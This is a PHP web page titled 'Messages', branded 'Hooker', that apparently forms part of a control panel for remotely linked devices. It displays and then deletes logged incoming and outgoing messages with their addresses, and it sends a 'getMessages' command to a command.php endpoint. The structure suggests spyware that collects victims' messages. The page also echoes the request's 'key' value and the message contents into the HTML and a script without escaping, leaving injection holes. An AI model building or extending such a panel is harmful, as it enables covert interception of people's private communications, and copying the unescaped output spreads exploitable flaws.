<?php
$log_file = dirname(__FILE__) . '/' . "messages.log";
$key = "";
$msgList = file_get_contents($log_file);
if(hasParam("key"))
{
$key = urldecode($_REQUEST['key']);
}

if(strlen($msgList) > 1)
{
$sections = explode("||",$msgList);
$wasKey = $sections[0];
$allMsg = $sections[1];
$messages = explode("\n", $allMsg);


$pageHTML = '';

if($msgList != null)
{
foreach($messages as $msg)
{
  $bits = explode("•••",$msg);
  
 if(count($bits) > 1)
{
  $direction = $bits[0];
  $address = $bits[1];
  $message = urldecode($bits[2]);
  $pageHTML .= '

<tr><td class="body-item mbr-fonts-style display-7">'.$direction.'</td><td class="body-item mbr-fonts-style display-7">'.$address.'</td><td class="body-item mbr-fonts-style display-7">'.$message.'</td></tr>

';
}
}
file_put_contents($log_file,"");

}
}

function hasParam($param) 
{
   if (array_key_exists($param, $_POST))
    {
       return array_key_exists($param, $_POST);
    } else
    {
      return array_key_exists($param, $_GET);
    }
}
?>

<!DOCTYPE html>
<html >
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="generator" content="Mobirise v4.7.5, mobirise.com">
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
  <link rel="shortcut icon" href="assets/images/logo.png-128x128.png" type="image/x-icon">
  <meta name="description" content="Update device messages ">
  <title>Messages</title>
  <link rel="stylesheet" href="assets/web/assets/mobirise-icons/mobirise-icons.css">
  <link rel="stylesheet" href="assets/tether/tether.min.css">
  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-grid.min.css">
  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-reboot.min.css">
  <link rel="stylesheet" href="assets/dropdown/css/style.css">
  <link rel="stylesheet" href="assets/datatables/data-tables.bootstrap4.min.css">
  <link rel="stylesheet" href="assets/theme/css/style.css">
  <link rel="stylesheet" href="assets/mobirise/css/mbr-additional.css" type="text/css">
  
  
  
</head>
<body>
  <section class="menu cid-tJGKFu9bCj" once="menu" id="menu2-d">

    

    <nav class="navbar navbar-expand beta-menu navbar-dropdown align-items-center navbar-fixed-top navbar-toggleable-sm">
        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <div class="hamburger">
                <span></span>
                <span></span>
                <span></span>
                <span></span>
            </div>
        </button>
        <div class="menu-logo">
            <div class="navbar-brand">
                <span class="navbar-logo">
                    <a href="index.php">
                        <img src="assets/images/logo.png-128x128.png" alt="CACS" title="" style="height: 3.8rem;">
                    </a>
                </span>
                <span class="navbar-caption-wrap"><a class="navbar-caption text-white display-4" href="index.php">Hooker<br></a></span>
            </div>
        </div>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <ul class="navbar-nav nav-dropdown nav-right" data-app-modern-menu="true"><li class="nav-item">
                    <a class="nav-link link text-white display-4" href="Devices.php">Linked Devices<br></a>
                </li></ul>
            
        </div>
    </nav>
</section>

<section class="section-table cid-tJGL2V43Di mbr-parallax-background" id="table1-h">

  
  
  <div class="container container-table">
<br/>
<br/>
      <h2 class="mbr-section-title mbr-fonts-style align-center pb-3 display-2">Messages&nbsp;</h2>
      <h3 class="mbr-section-subtitle mbr-fonts-style align-center pb-5 mbr-light display-5" style="font-size: 14px;"><?php echo $key; ?>    
      </h3>
      <div class="table-wrapper">
        <div class="container">
          <div class="row search">
            <div class="col-md-6"></div>
            <div class="col-md-6">
                <div class="dataTables_filter">
                  <label class="searchInfo mbr-fonts-style display-7">Search:</label>
                  <input class="form-control input-sm" disabled="">
                </div>
            </div>
          </div>
        </div>

        <div class="container scroll">
          <table class="table isSearch" cellspacing="0">
            <thead>
              <tr class="table-heads ">
                  
                  
                  
                  
              <th class="head-item mbr-fonts-style display-7">TYPE</th><th class="head-item mbr-fonts-style display-7">Address&nbsp;</th><th class="head-item mbr-fonts-style display-7">Message</th></tr>
            </thead>

            <tbody id="table">
              
              
              
              
            
                
                
                
                <?php echo $pageHTML; ?>
              
                
                
                
                
              </tbody>
          </table>
        </div>
        <div class="container table-info-container">
          <div class="row info">
            <div class="col-md-6">
              <div class="dataTables_info mbr-fonts-style display-7">
                <span class="infoBefore">Showing</span>
                <span class="inactive infoRows"></span>
                <span class="infoAfter">entries</span>
                <span class="infoFilteredBefore">(filtered from</span>
                <span class="inactive infoRows"></span>
                <span class="infoFilteredAfter"> total entries)</span>
              </div>
            </div>
            <div class="col-md-6"></div>
          </div>
        </div>
      </div>
    </div>
</section>

<section class="mbr-section content8 cid-tJGM3C4fqz" id="content8-i">

    

    <div class="container">
        <div class="media-container-row title">
            <div class="col-12 col-md-8">
                <div class="mbr-section-btn align-center"><button id="linkBack" class="btn btn-primary display-4" onClick="getMessages();">UPDATE MESSAGES</button></div>
            </div>
        </div>
    </div>
</section>


  <script src="assets/web/assets/jquery/jquery.min.js"></script>
<script>

 function getMessages (){
var link = document.getElementById("linkBack");
   link.innerHTML = "Gathering Messages...";
 
$.ajax({
   type: "post",
   url:location.origin + "/command.php",
   data: {
    task: "getMessages",
    key: "<?php echo $key; ?>"
  },
   success: function(response) {
   var back = response;
   setTimeout(function () {
             window.location.href = location.origin + "/Messages.php";
            }, 30000);
   }
});

}


   </script>

  <script src="assets/popper/popper.min.js"></script>
  <script src="assets/tether/tether.min.js"></script>
  <script src="assets/bootstrap/js/bootstrap.min.js"></script>
  <script src="assets/smoothscroll/smooth-scroll.js"></script>
  <script src="assets/dropdown/js/script.min.js"></script>
  <script src="assets/touchswipe/jquery.touch-swipe.min.js"></script>
  <script src="assets/datatables/jquery.data-tables.min.js"></script>
  <script src="assets/datatables/data-tables.bootstrap4.min.js"></script>
  <script src="assets/parallax/jarallax.min.js"></script>
  <script src="assets/theme/js/script.js"></script>
  
  
</body>
</html>